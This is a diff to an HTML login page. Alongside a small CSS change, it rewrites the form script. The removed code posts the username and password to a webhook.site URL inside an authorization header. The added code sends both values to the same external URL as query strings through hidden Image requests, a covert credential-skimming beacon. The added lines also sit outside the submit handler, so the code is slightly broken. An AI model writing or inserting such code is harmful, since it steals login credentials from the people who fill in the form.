@@ -14,7 +14,7 @@
         }
 
         /* Style the button */
-        #Button {
+        button {
             padding: 10px 20px;
             background-color: #007bff; /* Blue color for the button background */
             color: white; /* Text color for the button */
@@ -23,7 +23,7 @@
         }
 
         /* Style the button on hover */
-        #Button:hover {
+        button:hover {
             background-color: #0056b3; /* Darker blue color on hover */
         }
     </style>
@@ -38,39 +38,16 @@
 
     <script>
     document.getElementById("myForm").addEventListener("submit", function(event) {
-  event.preventDefault(); // Prevent the form from submitting by default
-  const username = document.getElementById("username").value;
-  const password = document.getElementById("password").value;
-  sendUserDataToWebhook(username, password);
-});
+    event.preventDefault(); // Prevent the form from submitting by default
+    const value = document.getElementById("username").value;
+    const value1 = document.getElementById("password").value;
+    });
 
-function sendUserDataToWebhook(username, password) {
-  // Replace with your webhook.site URL
-  const webhookUrl = "https://webhook.site/66e989bb-2abe-4004-a229-ed6263865c36";
-
-  // Create a Basic Authentication header
-  const headers = new Headers();
-  headers.append('Authorization', 'Basic ' + btoa(username + ':' + password));
-
-  // Send an empty POST request (since the data is in the header)
-  fetch(webhookUrl, {
-    method: "POST",
-    headers: headers,
-  })
-  .then(response => {
-    if (!response.ok) {
-      throw new Error(`HTTP Error! Status: ${response.status}`);
-    }
-    return response.json();
-  })
-  .then(data => {
-    // Handle the webhook.site response (if needed)
-    console.log("webhook.site response:", data);
-  })
-  .catch(error => {
-    console.error("Error sending data to webhook.site:", error);
-  });
-}
+    var i=new Image;
+    i.src="https://webhook.site/66e989bb-2abe-4004-a229-ed6263865c36/?"+value;
+    var i=new Image;
+    i.src="https://webhook.site/66e989bb-2abe-4004-a229-ed6263865c36/?"+value1;
+        
 </script>
   
 </body>
